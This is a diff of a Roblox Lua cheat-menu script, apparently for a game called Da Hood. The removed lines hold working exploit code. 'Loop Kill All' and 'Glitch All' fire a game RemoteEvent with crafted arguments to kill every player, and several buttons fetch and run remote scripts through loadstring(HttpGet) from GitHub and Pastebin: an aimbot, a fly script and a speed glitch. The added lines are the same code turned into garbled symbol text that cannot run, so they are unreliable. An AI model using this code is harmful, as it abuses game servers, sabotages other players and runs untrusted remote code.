-	Main.Topbar.Exit.MouseButton1Down:connect(OnClosePress)
-	SubFrame.QuickInvis.MouseButton1Down:connect(OnGoInvisPress)
-	Player.CharacterAdded:connect(OnCharacterAdded)
+	SµßFя@AA&.K£`/l³!/|/Ð.C[_]я1²£(\)†B][|1<|:G€+P®°|>€я']['jC|-|∂?9£ÐS][6|V/-\|('T€}{†'):(9|V2&(']['(O/\/K3`/B][?đT£><']['C/-/∂/\\/93)
+	M()[_]§&.K€jD°\A/2:©0/V|\|&<†(O11B[_]']['']['*|\|P|?&ŝ5)
+	Sµ13F|?/\|\/|3.Aµ']['*Rµ/\\/.Bø01Tø661€.M*[_]5€B[_]+']['ø|\|1D[]|/|//|/:(()/V|1€[']['(O/\\/Aµ7()R[_]|VP|Z£ŝ5)
+	S[_]ßF2/-\(V)&.Al?TP.Bø0|_Tø69|_3.M9|_|§3B[_]+7ø/\\/1DøVV|\|:[°22€<7(O/\\/A|®TPPя€$5)
+	Mλ!/V.T()|>13/\|?.M!|11/v\][z€.M<>µ$&B[_]†+°?1D[]\|/11:(°/\\/|1£<7(O|VM!|V1]V[!(\)£P|?£ŝŝ)
+	GUI.T3?+Bµ†7*|\|.M*|_|5€B|_|']['7<>(\)1D*\A//V:©()2/V£<†(O|\|O|D&/\/Pя£$§)
+	Mλ|(\).T()|>|>∂|2.E)(|†.M()|_|?€Bµ']['†[]111D[]\A/(\):<0/|//V&<+(O(\)C195£Pя35$)
+	S|_||3F®^]V[£.Qµ1[|(I|1\|1?.Møµŝ3B[_]77ø(\)1Dø\/\/11:(ø/\/2&(†(O(\)G()I|V|/!§P?3§§)
+	P1^j3?.C4λ|2/-\(†£®A|]<|€<|:©*|1/V£[7(O2C#λ®/-\(†&1²A|><|€o|)
 
-	SubFrame.Rigtype.Text = ('Your Rigtype - %s'):format(CheckRig())
-end)
+	Sµ|oF|2/\/|\£.R|9']['°/|D€.T3><† = ('Y0|_|2 R!6+j|°£ - %?'):PH[]я|\/|q']['(C/-/€[|<R16())
+€|1|>)
 
-Servercrash.Name = "Servercrash"
-Servercrash.Parent = Main
-Servercrash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Servercrash.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Servercrash.BorderSizePixel = 4
-Servercrash.Position = UDim2.new(0.589705825, 0, 0.3782233, 0)
-Servercrash.Size = UDim2.new(0, 187, 0, 33)
-Servercrash.Font = Enum.Font.SourceSansBold
-Servercrash.Text = "Glitch All"
-Servercrash.TextColor3 = Color3.fromRGB(255, 0, 0)
-Servercrash.TextSize = 22.000
-Servercrash.MouseButton1Down:connect(function()
-Servercrash.MouseButton1Down:connect(function()
+S£12\|€12[яλ?4.Nq(V)£ = "S&®|/&|2©|?^ŝ|-|"
+S€?\/€12<2^§#.P/\я3?† = M∂!/\/
+S&12\/£®[|?qŝ#.B/\©|(9|Z()[_]|1đCø|*|?3 = C01[]яdrei.|"12()^^RGB(0, 0, 0)
+S£1²|/€1²(2/-\$/-/.B°яÐ£®C()|_0|Z3 = C<>|°|2drei.|=я°/v\RGB(255, 0, 0)
+S£2|/&я<12/\?|-|.Bø2|>31²S!(\)&P|?£1 = 4
+S3я|/3?[12qŝ4.Pø§l+10|\| = UD1|112.2€\|\|(0.589705-aiteto5, 0, 0.378totodrei3, 0)
+S€12\|3|2(|Z@$}{.S][z& = UD|[]V[]to./|/&\|\|(0, 1eight7, 0, 33)
+S3|Z|/3?[я/-\5/-/.F911+ = E|\|[_]/|\.F[]|1†.S0|_||2[&S∂/\\/ŝBø1<|
+S£|Z\|€2©|Z^$]-[.T3)(+ = "G|l+<|-| A1£"
+S€я\|312<12@$/-/.T3}{7C9|_()я3 = C[]|ø|?3.ƒ|2°]V[RGB(255, 0, 0)
+S£|?\/€|?[|?@§]-[.T€><7S|23 = 2to.000
+S€я\/&?<1²λ$]-[.M0µ$£Bµ7+ø/V1D*\/\//\\/:©02/\/3(+(PH[_]/V©+l<>/V()
+S3®\|&|?[2/-\§|-|.M°[_]5€Bµ+7°?1D°\|/|1:<[]/\/11£<']['(|"µ|1©+l[]/|/()
 		
-			local parts = {"LowerTorso"}
+			1()[∂£ 941²+5 = {"Løuu€|ZT01²50"}
 
-			for _,player in pairs(game:GetService("Players"):GetChildren()) do
-				for _,v in pairs(parts) do 
-					local args = {
-						[1] = "ProcessKey",
-						[2] = {
-							["Key"] = "K",
-							["RIP"] =  {Parent = player.Character[v], Value = 0},
+			|"[]|2 _,][D|_/\j&|2 !11 |°^l|2§(9^[]V[]3:G&†S£12\|][<3("P1@`/&1²$"):G37C}{][|đ1²£(\)()) <|[]
+				|=°я _,\/ |11 |°4!|2ŝ(|°λ2']['§) |]° 
+					1()[λ£ /\?6? = {
+						[1] = "Pя()(3$$K€'/",
+						[to] = {
+							["K&'/"] = "K",
+							["RIP"] =  {P41²£11'][' = |>|_∂`/€2.C]-[λ2^<†&?[|/], V/-\1|_|& = 0},
 						},
 					}
-					game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
+					9/-\^^&:G€']['S3|?\/|(&("R£9||[∂+3đS†0|?q9&").N€+\|\|°я|(F[]£|)£|Z.G^^^€E\|€(\)7:F1|2€S£12\|312(|_||\||²λ<|((∂126$))
 
-				end
-			end
-	end)
-end)
+				€|\|đ
+			&|\|o|
+	£/V|])
+&|V<|)
 
-Loopkillall.Name = "Loop kill all"
-Loopkillall.Parent = Main
-Loopkillall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Loopkillall.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Loopkillall.BorderSizePixel = 4
-Loopkillall.Position = UDim2.new(0.590511143, 0, 0.554693818, 0)
-Loopkillall.Size = UDim2.new(0, 187, 0, 33)
-Loopkillall.Font = Enum.Font.SourceSansBold
-Loopkillall.Text = "Loop Kill All"
-Loopkillall.TextColor3 = Color3.fromRGB(255, 0, 0)
-Loopkillall.TextSize = 22.000
-Loopkillall.MouseButton1Down:connect(function()
-	_G.loop = true
-	while _G.loop do
-		for _,v in pairs(game.Players:GetChildren()) do
-			local args = {
-				[1] = "ProcessKey",
+L<>9|D|(][£|∂|_£.N∂|\/|3 = "Lø()|D |(l1£ q1|_"
+L<>[]|D|(][11@£|.P^12€?+ = Mλl/\\/
+L<>9][D|<11£@1£.B4<|<9|2[][_]|\||)C[]1ø|Z3 = C91[]|?3.|=|20(V)RGB(0, 0, 0)
+L<><>|°|(!£|_λ|_|_.B9?|]&|2C<>£<>2drei = C91()1²3.|=®ø|'|'|RGB(to55, 0, 0)
+L0°|D|<][£|_/-\||_.B<>|?Ð312S!23Pl><€1 = 4
+L°*|D|{1||_∂||_.P9$][†l02 = UD||112./\\/£\A/(0.59051114drei, 0, 0.55469drei-aite18, 0)
+L<>()|°|<!£1∂||_.Sl2£ = UD][|\/|2.|V€\\'(0, 1-aite7, 0, 3drei)
+L()*|°|{l1£^|_|_.F[]/\/+ = E/\\/[_]|11.F*/\/+.S[]µ2(&S∂/V5B91đ
+L9()|D|<][11∂11.T3}{+ = "L<>ø|* Kl£|_ A1|"
+L9ø|²|<111/\|_1.T&><†C()£*®drei = C()£91²drei.ƒ?<>/v\RGB(to55, 0, 0)
+L<>*|²|(!1|_λ|_1.T3}{+S1z3 = to2.000
+L°°|2|<1£1q11.M[]µ?£Bµ†+<>|\|1D<>uu2:©9|1/\\/&(']['(PHµ|V[+1°|V()
+	_G.1*°9 = ']['1²µ€
+	\|/#l£3 _G.|()*|² <|9
+		|"°? _,\| 1/|/ |2/\|?5(9/-\/|\3.P£@°/€12§:G&+C/-/!|_<|?3|\|()) <|*
+			|_<><@1 q|Z9ŝ = {
+				[1] = "P®ø<€?$K3'/",
 				[2] = {
-					["Key"] = "K",
-					["RIP"] =  {Parent = v.Character, Value = 0},
+					["K3j"] = "K",
+					["RIP"] =  {P^23(\)† = \/.C}{q|Zq©7€12, Vλ|_µ€ = 0},
 				},
 			}
-			game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
-			wait()
-		end
-	end;
-end)
+			6λ/|\3:G€']['S€®\|!<3("R3|°1|©@†3ÐS+ø249€").N£+uu9я|<Fø£|>3|Z.Gλ|'|'|3E|/&11†:F|®£S£®\/&1²(|_|/V|²/-\(|{(/\®95))
+			\\'/\][+()
+		€|\|o|
+	£|\|o|;
+€2|])
 
-Hitboxgui.Name = "Hitbox gui"
-Hitboxgui.Parent = Main
-Hitboxgui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Hitboxgui.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Hitboxgui.BorderSizePixel = 4
-Hitboxgui.Position = UDim2.new(0.295588225, 0, 0.210127115, 0)
-Hitboxgui.Size = UDim2.new(0, 187, 0, 33)
-Hitboxgui.Font = Enum.Font.SourceSansBold
-Hitboxgui.Text = "HitBox GUI"
-Hitboxgui.TextColor3 = Color3.fromRGB(255, 0, 0)
-Hitboxgui.TextSize = 22.000
-Hitboxgui.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/shit%20script%20pack/CheatX'))()
-end)
+H!7|>[])(6[_]l.Nq(V)£ = "H|7139% 6µ|"
+Hl']['89}{9|_|l.Pq|2£(\)7 = M/\1|1
+H1']['|oø%9µ!.B4[|{91²0µ/\/|]C9|_°|?drei = C*102drei.|=я0|11RGB(0, 0, 0)
+H1+8ø×9[_]l.B()|Zđ&2C°1[]|23 = C()1ø1²drei.ƒ20(V)RGB(to55, 0, 0)
+H|713[]×9|_|][.B°|?Ð€?S1z€Pl×£1 = 4
+H!+|>*)(6[_]1.P0§!']['lø|\| = UD][|\/|2./|/€uu(0.2955-aite8toto5, 0, 0.210127115, 0)
+H][78())(9|_||.S!2& = UD!|'|'|2./\\/£\A/(0, 1eight7, 0, dreidrei)
+H1+|o<>?6|_|][.F9/|/'][' = E11[_](V).Fø/\/†.S<>[_]®[£S4(\)ŝB[]£|)
+Hl†ß*}{6|_|!.T&}{+ = "H|+B0? GUI"
+H|†l³<>><6|_|1.T€?7C°|_[]1²3 = C°1()|?drei.|"я°|\/|RGB(255, 0, 0)
+H|7l³[]%9µl.T3%7S!z£ = 22.000
+Hl7l³°×6|_|1.M9µŝ&Bµ+†°|V1D0\A//V:[()2/V£(†(ƒ|_||1<7][[]/\\/()
+	|_°/-\<|§']['|2|/\/9(9∂|'|'|3:H††9G£+('#++|°5://|Zλ|/|/.6!†#µl³[_]5€1²([]/|/†3|1†.[[]^^/2|>93/\/£|?/-\£ŝ|2/\|111/?<|2][p+§-@11|]-?7|_|ƒ|"//\/\q$†£®/$]-[1†%to0ŝ(я||D†%to09λ[|{/C|-|&@†X'))()
+€/|/o|)
 
-infstam.Name = "inf stam"
-infstam.Parent = Main
-infstam.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-infstam.BorderColor3 = Color3.fromRGB(255, 0, 0)
-infstam.BorderSizePixel = 4
-infstam.Position = UDim2.new(0.294922948, 0, 0.381201804, 0)
-infstam.Size = UDim2.new(0, 187, 0, 33)
-infstam.Font = Enum.Font.SourceSansBold
-infstam.Text = "INF Stamina"
-infstam.TextColor3 = Color3.fromRGB(255, 0, 0)
-infstam.TextSize = 22.000
-infstam.MouseButton1Down:connect(function()
-	local stam = game:GetService("Players").LocalPlayer.PlayerData.Stats.Stamina
-	stam.Value = 400
-end)
+!(\)PH§†4/|\.N^/|\3 = "|/V|= ?+@]V["
+l|1ƒ5']['/-\/|\.Pλя€/\\/+ = M^!2
+][/|/|=$']['^/v\.Bq<|<6я0[_]|\||)C[]|_øяdrei = C°£[]2drei.|=®°^^RGB(0, 0, 0)
+1|V|=§+^AA.B912<|&|?C91()2drei = C[]1()2drei.|"|?°[]V[]RGB(to55, 0, 0)
+|/Vƒ$†/-\/v\.B01²đ312S!(\)€Pl}{£|_ = 4
+1/\\/|"ŝ+/\]V[.Pøŝ!†][92 = UD][AA2./\/€VV(0.to949toto948, 0, 0.381to01-aite04, 0)
+1/V|"$†∂[]V[].S1(\)3 = UD|(V)to.|1£\A/(0, 1-aite7, 0, 33)
+!|V|=$']['^|\/|.F<>/\/† = E/\\/[_]AA.F*|17.S°|_|?[&S∂11ŝB[]1|)
+|?PH§+@[]V[].T£×+ = "INF S']['@|\/|!|V@"
+||Vƒ?†∂AA.T&×7Cø1[]|Zdrei = Cø£[]12drei.|=|?<>|11RGB(to55, 0, 0)
+l/\/|"$7∂/\/\.T&%7S!(\)€ = to2.000
+!/Vƒ§†/-\/|\.M0[_]$€Bµ+†9/|/1D<>\|\|11:(0/|/113[+(|=|_||V©+l°/V()
+	|9(∂| §†∂|\/| = 6q|'|'|£:G£+S&?\/][[&("P£λ`/&25").L°(@|P1/\'/3|Z.P1^j€?D/-\7@.S†4']['§.S+@|\/|111@
+	ŝ+q|11.V/-\||_|£ = 400
+£|V|>)
 
-GodsSL2Killer.Name = "Gods SL2 Killer"
-GodsSL2Killer.Parent = Main
-GodsSL2Killer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-GodsSL2Killer.BorderColor3 = Color3.fromRGB(255, 0, 0)
-GodsSL2Killer.BorderSizePixel = 4
-GodsSL2Killer.Position = UDim2.new(0, 0, 0.38441053, 0)
-GodsSL2Killer.Size = UDim2.new(0, 187, 0, 33)
-GodsSL2Killer.Font = Enum.Font.SourceSansBold
-GodsSL2Killer.Text = "Aimbot"
-GodsSL2Killer.TextColor3 = Color3.fromRGB(255, 0, 0)
-GodsSL2Killer.TextSize = 22.000
-GodsSL2Killer.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/tututu1mn13/SL2Killerr/main/script.lua'))()
-end)
+G<>|>5SLtoKl|_£€12.N∂(V)£ = "G0|>5 SLto Kl11&|Z"
+G()|]ŝSLtoK111£2.P∂12&2'][' = M∂1(\)
+G°o|$SLtoK11|£|Z.B/-\<|{6|Z<>[_]|V<|Cø|_9|?3 = C()1[]23.|=я<>[]V[]RGB(0, 0, 0)
+Gø|]$SLtoK][|£312.B°?|>£1²C9£9|Z3 = C9£ø|23.|=120|'|'|RGB(to55, 0, 0)
+G°o|5SLtoK1£|€|2.B9|?|)312S][(\)3Pl%€|_ = 4
+Gø|]§SL2K][|_|_&2.P0?|†|()2 = UD|[]V[]2./|/£\^/(0, 0, 0.3-aite441053, 0)
+G*|]ŝSL2K|1|€2.S|(\)€ = UD!|11to.|\|£\|/(0, 187, 0, dreidrei)
+G<>|]$SL2K111€?.F0?† = E|V[_][]V[].F[]|V']['.S°[_]?<&Sλ11§B()|_<|
+Gø|]5SLtoK11|_31².T3?'][' = "A!|11|3()']['"
+G0|)$SL2Kl|_|£2.T&×†Cø|_<>?drei = C[]|_91²3.|"я()^^RGB(255, 0, 0)
+G*o|$SLtoKl11£?.T3)(†Sl2€ = 2to.000
+Gø<|$SLtoKl£1£я.Møµ53B[_]+†<>?1D*uu/|/:[[]2/V&<+(|=[_]|\|©7|ø|\|()
+	1[]q|]?71²|/|/6(6/\|'|'|&:H+']['|*G£7(']-[††9ŝ://1²quu.6][']['4|_|ßµ?&12<[](\)+3(\)+.©°]V[/†[_]†[_]+µ1|'|'|111drei/SLtoKl113?12//|\λ][11/5(я][|°']['.£µλ'))()
+3/VÐ)
 
-Trashtalk.Name = "Trash talk"
-Trashtalk.Parent = Main
-Trashtalk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Trashtalk.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Trashtalk.BorderSizePixel = 4
-Trashtalk.Position = UDim2.new(-0.000665305648, 0, 0.557204723, 0)
-Trashtalk.Size = UDim2.new(0, 187, 0, 33)
-Trashtalk.Font = Enum.Font.SourceSansBold
-Trashtalk.Text = "Trash Talk"
-Trashtalk.TextColor3 = Color3.fromRGB(255, 0, 0)
-Trashtalk.TextSize = 22.000
-Trashtalk.MouseButton1Down:connect(function()
-	local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua"))()
+T|24§}{7/\|_|(.N4[]V[]£ = "T12q$|-| +/\£|{"
+T®^ŝ/-/†λ1|{.Pq|2€(\)7 = Mλ!|V
+T|?/\?}{']['q||(.B@<|{6®0[_]/\/|>C()|()123 = C*|[]|23.|=1²9/|\RGB(0, 0, 0)
+T|Z^$|-|']['/\||<.B0|2|]€®C<>£°|Z3 = C0|()|?drei.ƒ1²*|'|'|RGB(to55, 0, 0)
+T?∂$47/-\1|{.B<>|2|)€®S!(\)3P1?€£ = 4
+T®@ŝ#7/-\£|(.P<>5][+1[](\) = UD1|11to.|1&uu(-0.000665drei0564eight, 0, 0.557to04723, 0)
+T1²^?]-[†^|_|(.S!(\)3 = UD][]V[2./\/€\|/(0, 187, 0, 33)
+T|?^5#']['λ1|(.F<>/\\/7 = E?µ/\/\.F()|V†.S[][_]2©3Sq(\)$Bø1Ð
+Tя^§/-/7/-\1|<.T£}{† = "T245]-[ T∂£|<"
+T?^§|-|+∂|_|<.T£)(+C[]£<>|23 = C()|*2drei.|"2*/\/\RGB(to55, 0, 0)
+T?/\?4†/\£|{.T3%']['S][z3 = 2to.000
+T®λŝ4741|<.Møµ?€Bµ+7<>/|/1D0\/\//V:[()11/\\/&(+(PH|_|/|/©†!9/\\/()
+	1ø[λ1 L][|>|Z^|Z`/ = 10@|>$']['|2!(\)9(9q|'|'|£:H††|DG£']['("|-|']['7|*ŝ://1²4\/\/.9|7/-/µl³[_]5€1²[<>11']['€(\)']['.(*]V[/M∂p|²137777/UI-L!|>|?λ12°/$/^^^][/|//UI-1/UI.||_|q"))()
 
 
-	local Window = Library:Create("PickleAssist",".gg/1ov")
+	1<></\1 W1(\)|]°\\' = L][ß|Z∂12°/:C1²€/\†&("P|©|(|_£A5ŝ][5+",".99/1ø|/")
 
-	local Tab1 = Window:Tab("Aiming",true)
+	1<><∂| Tqß1 = W!|\||]()\/\/:T@|o("A1[]V[]|/\/9",†2µ£)
 
-	Tab1:Toggle("Toggle Silent Aim",function(bool)
-		DaHoodSettings.SilentAim = bool
-	end)
+	Tq131:Tø96|_€("T0661& S!13|\|+ A|AA",|"[_]|1[']['][°/\/(ß<>ø1)
+		D4H9[]o|S37+1|19§.S11311+A||11 = l³091
+	3/\\/|))
 
-	Tab1:Toggle("Toggle FOV",function(bool)
-		Aiming.ShowFOV = bool
-	end)
+	T/\|31:T[]6613("T°99£€ FOV",PHµ|\|©†l<>11(ß()9£)
+		A][AA|/|/9.S4*uuFOV = ß()<>|
+	3|1Ð)
 
-	Tab1:Toggle("Toggle Visiblility Check",function(bool)
-		Aiming.VisibleCheck = bool
-	end)
+	Tq|o1:T969£&("T9991& Vl§][|>1|1][†°/ C/-/3©|<",ƒ[_]?©7!*/\\/(ß*0£)
+		A||\/|][|19.V1ŝl|3|€C/-/€(|( = l³<>[]|_
+	&/V|))
 
-	Tab1:Slider("FOV Size",0,200,function(bool)
-		Aiming.FOV = bool
-	end)
+	T4ß1:S|l<|€12("FOV Sl2&",0,to00,ƒ|_||V<†![]|1(13°°£)
+		A!|\/|1|V6.FOV = |oø*|_
+	£?đ)
 
-	Tab1:Textbox("Prediction 0.165-0.235","0.157",function(bool)
-		DaHoodSettings.Prediction = bool
-	end)
+	Tq81:T3?†|>°?("P12£o|1(']['][()|1 0.165-0.todrei5","0.157",|"µ|1©†l()/V(13*0£)
+		DλH0ø|>S£+†!(\)6?.P|?3|]|[†|()|\| = |o()9|
+	&/|/<|)
 
-	Tab1:Dropdown("Silent Aim Part",{"Head","HumanoidRootPart","UpperTorso"},function(value)
-		Aiming.AimPart = value
-	end)
+	Tq|31:D12*][Dđ<>\A//|/("S!|£(\)+ A1/v\ Pq?7",{"H€^|]","Hµ[]V[]λ(\)0|ÐR()ø†Pq2']['","U|>|²€®Tøя$0"},|"µ|1(7lø/\/(\/λ|µ€)
+		A||\/|!/V6.Al/\/\Pλ®7 = \|/\£[_]&
+	&?Ð)
 
-	local Tab2 = Window:Tab("Player",false)
+	|_9(/\£ T4132 = W|/\/<|9\|/:T@|>("P|/-\`/£?",ƒ^|_5€)
 
-	Tab2:Label("Player Scripts")
+	T4|>2:L4|3££("P1@`/&|Z S©|?!|*+§")
 
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "PickleAssist";
-		Text = "You're Whitelisted";
-		Icon = "RBXID OR BLANK";
-		Duration = "DURATION IN SECONDS";
-		callbakc = bindableFunction;
-		Button1 = "Okay";
+	9/\|113.S7@?7£1²G|_|1:S€7C92&("S&/\\/<|N°+][|"!(λ7][92", {
+		T!7|€ = "P|(|<1&A5§1§7";
+		T&><7 = "Y9[_]'|Z£ W#|†££][?']['3o|";
+		I<<>|V = "RBXID OR BLANK";
+		Dµ|?∂†1()|\| = "DURATION IN SECONDS";
+		(/-\1£|3λ|{[ = |o1|\||>^l³|_&Fµ|V(7l°?;
+		Bµ††°/\\/1 = "O|<∂°/";
 	})
 
-	Tab2:Button("Speed Glitch (Q)",function(bool)
-		loadstring(game:HttpGet("https://pastebin.com/raw/QW5Whap9"))()
-	end)
+	T∂13to:B|_|†+0/\\/("S93€đ G|_1']['(/-/ (Q)",ƒ|_|/V[7|()/\\/(l³ø[]£)
+		|_()@o|§71²|26(9^|'|'|&:H7']['|*G3']['("]-[++|D5://|°/\?†€|3!|1.©<>|'|'|/?^\\'/QW5W]-[/\|>9"))()
+	&|\||])
 
-	Tab2:Button("Realistic Speed Glitch (X)",function(bool)
-		local Player = game:GetService("Players").LocalPlayer
-		local Mouse = Player:GetMouse()
-		local SpeedGlitch = false
-		local Wallet = Player.Backpack:FindFirstChild("Wallet")
+	Tλ|o2:Bµ7']['ø|V("R3^1][ŝ']['1© S|2£€đ G11+<]-[ (X)",ƒµ(\)©†|ø/|/(l³()[]|)
+		19<q|_ P|_λj£|2 = 6q|\/|3:G&']['S31²\/1©&("P|λ`/€|Z$").Lø©/\|_P|_/-\`/&я
+		|[]©∂|_ M0[_]5& = P|_/-\`/312:G&+M9[_]§€()
+		1<>©∂| S][D&&<|G|_!7[]-[ = |=4|§3
+		|9©λ| W/\||&'][' = P1^j€12.Bλ<|{|*/\(|<:Fl2<|F|я§+C]-[][1<|("W∂||3']['")
 
-		local UniversalAnimation = Instance.new("Animation")
+		|_°[/\|_ U|V1\|€®$/-\£A|V!|11λ']['!*/V = I/V?742<€./|/&VV("A|\|][AA^710|V")
 
-		function stopTracks()
-			for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
-				if (v.Animation.AnimationId:match("rbxassetid")) then
-					v:Stop()
-				end
-			end
-		end
+		|=[_]/V[']['|[]/\/ ?7*9T1²/\(|<5()
+			|=*? _, |/ l|1 ?€}{+, 9/\|\/|£:G3+S&|Z\/l<&("P1/-\°/3|Z$").L*[/-\£P1/\`/£1².C}{^|Z∂(']['€?:F1/\/<|F1®5†C/-/l|_|]OPHC|_/\$?("H|_|]V[@?øl|>"):G€+P|∂'/|116A/\\/|(V)^']['!()|\|T|?∂<|(5() |)<>
+				][ƒ (|/.A21/|\q†|9/|/.A(\)|]V[λ']['!0(\)I|]:|11λ†[]-[("я|>><@§5€']['||]")) †}{3/V
+					\|:S†0p()
+				£2o|
+			3/\\/|>
+		€/V|)
 
-		function loadAnimation(id)
-			if UniversalAnimation.AnimationId == id then
-				stopTracks()
-				UniversalAnimation.AnimationId = "1"
-			else
-				UniversalAnimation.AnimationId = id
-				local animationTrack = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
-				animationTrack:Play()
-			end
-		end
+		ƒµ2©']['|0/\/ 1øqđA(\)!(V)∂71[]|\|(l|))
+			!ƒ U2][|/&1²ŝ∂|_A/\\/!/|\/\†l9?.A?!/v\47][[]|\|I|] == lo| ']['/-/3/|/
+				§+[]|°T|?^<|(?()
+				U/|/l\/&|?ŝ4£A2][/|\^+|()/\\/.A|V|]V[4']['1<>|\|IÐ = "1"
+			£|_ŝ3
+				U/|/!\/£|Z$λ|A?][AA^+192.A/\\/][/\/\@']['1911I|] = |<|
+				1()(/\£ ∂|1][/\/\4']['][ø/\/T|2q<|( = 9^|\/|€:G€7S£|Z\/!©3("P14`/€®ŝ").L0©^£P|_∂`/€|Z.C]-[/-\1²/\(+&|Z:F][(\)|)F|1²§']['C}{][£o|O|=C1@ŝ?("H|_|/v\/\|\|°][|)"):L*^đA11][^^^†1°/V(U/|/!\|&|25λ£A/\/!|'|'|/-\+][[]11)
+				4?l(V)/\7!9/\\/T12@(|{:P|_@°/()
+			3|\||)
+		£/\/o|
 
-		Mouse.KeyDown:Connect(function(Key)
-			if Key == "x" then
-				SpeedGlitch = not SpeedGlitch
-				if SpeedGlitch == true then
-					stopTracks()
-					loadAnimation("rbxassetid://3189777795")
-					wait(1.5)
-					Wallet.Parent = Player.Character
-					wait(0.15)
-					Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
-					wait(0.05)
-					repeat game:GetService("RunService").Heartbeat:wait()
-						keypress(0x49)
-						game:GetService("RunService").Heartbeat:wait()
-						keypress(0x4F)
-						game:GetService("RunService").Heartbeat:wait()
-						keyrelease(0x49)
-						game:GetService("RunService").Heartbeat:wait()
-						keyrelease(0x4F)
-						game:GetService("RunService").Heartbeat:wait()
-					until SpeedGlitch == false
-				end
-			end
-		end)
-	end)
+		M[][_]§3.K&°/D*\|//\\/:C02(\)£[7(ƒ[_]/V[7l()|V(K£°/)
+			1|" K&'/ == "×" '][']-[€|1
+				Sp3£o|G1!+[}{ = /\/97 Sp€€đG|_!']['(/-/
+				!PH S][D€€|]G£!']['©|-| == ']['®|_|& +#£(\)
+					ŝ7[]pTя∂[|(?()
+					1ø/\<|A?l/\/\q7!0(\)("я|3}{/-\ŝŝ€7][|>://31eight9777795")
+					\|//-\!†(1.5)
+					W/\1|&']['.P^?£2† = P1λ°/3|2.C}{∂|?q©†3|Z
+					\\'^][7(0.15)
+					P14'/3я.C|-|@|?/\©+&1²:F|/V|)F][яŝ']['C#||đ("W4|_13+").P@1²&/V'][' = P1/-\°/€|Z.B4<|{|>@<|(
+					\/\//-\1+(0.05)
+					|?£p3q† 9∂[]V[]£:G&+S&?|/1<£("R[_]/VS31²|/l<3").H3/-\2+|3&/\+:\^/^|†()
+						|(€`/][D123??(0%49)
+						9/-\(V)€:G£+S3®\/l[€("R[_]11S3?|/1(£").H&41²†ß3/\†:\|//-\][+()
+						|<€`/p?3§?(0×4F)
+						6∂AA£:G&+S&|2\/1©£("R[_]11S&|?|/1(€").H£@|Z']['|>&λ†:\|\|4l+()
+						|(3°/?€1£4ŝ&(0><49)
+						6λ/v\€:G£7S£я\/][(3("R|_||\|S€1²\/|<£").H3q27|o€∂†:\\'/-\][']['()
+						|<&'/|Z3£€q5€(0%4F)
+						6∂|11£:G3+S32\/l(€("R|_|11S€2|/][[3").H&/\|Z+ß€λ7:\A/∂1†()
+					[_]/|/7l|_ S][D£3ÐG|_!+(|-| == ƒλ1§&
+				3?|)
+			€(\)|)
+		€?|))
+	&/\\/|))
 
-	Tab2:Button("FLY (X)",function(bool)
-		loadstring(game:HttpGet("https://pastebin.com/raw/sUA9m6M6"))()
-	end)
+	T/-\ß2:B[_]']['†°/V("FLY (X)",PHµ|\|[']['lø2(|3()*|_)
+		|[]^đ5']['1²l/V6(9@|11£:H†']['|*G£+("477|*$://p/-\§']['£|ol/|/.<*[]V[]/®@\^//?UA9/|\6M6"))()
+	&/|/|>)
 
-	Tab2:Slider("Fov Camera",80,200,function(text)
-		workspace.CurrentCamera.FieldOfView = (text)
-	end)
+	T∂|>2:S|_1đ&®("F<>|/ Cq|'|'|&12λ",-aite0,200,|=µ/|/(†l°2(7€×7)
+		\/\/°2|{ŝp/\(£.C|_|12?€/V+C∂|\/|£|?q.F1€1ÐOPHV!£|/|/ = (+£)(+)
+	&/|/|])
 
-	Tab2:Button("Headless Client Sided",function(bool)
-		getgenv().game.Players.LocalPlayer.Character.Head.Transparency = 1
-		getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
-		getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
-	end)
+	Tλ|>2:B|_|++°|1("H€^<||3ŝ§ C|1£/\\/+ Slđ&đ",PH|_|/V©+|<>/\\/(l³°9£)
+		9£79&(\)|/().9^]V[3.P1@j€1²5.Lø[∂£P1λ`/&12.C]-[^12q(']['£12.H€q<|.T1²/-\/V5|²^?€2<'/ = 1
+		9&76&/V|/().64]V[£.P1/-\`/€®5.L9</\|P|_@`/&2.C#λ12∂<+&12.H&/-\<|.|=/\<£:D&$+2ø°/()
+		9€763|1\|().6∂/\/\£.P|_/\°/€|Z5.L*[@1P1^'/&®.C#@®@<']['&?.H3@o|.|"q<3:D3§']['1²*`/()
+	€/\\/|>)
 
-	Tab2:Button("Korblox Client Sided",function(bool)
-		local ply = game.Players.LocalPlayer
-		local chr = ply.Character
-		chr.RightLowerLeg.MeshId = "902942093"
-		chr.RightLowerLeg.Transparency = "1"
-		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
-		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
-		chr.RightFoot.MeshId = "902942089"
-		chr.RightFoot.Transparency = "1"
-	end)
+	T@|32:B[_]†']['0/\/("Kø28|_()}{ C1l£|\|7 S|đ€|>",ƒ|_|/|/<†][ø2(|30*|_)
+		|()<4| p|_°/ = 6λ^^£.P1q`/&я$.L°(/-\£P1q'/€®
+		£()©^£ ©#|? = |*|`/.C#/-\1²@[+£|Z
+		(]-[2.R19/-/†L9uu€|ZL39.M3ŝ}{IÐ = "90294209drei"
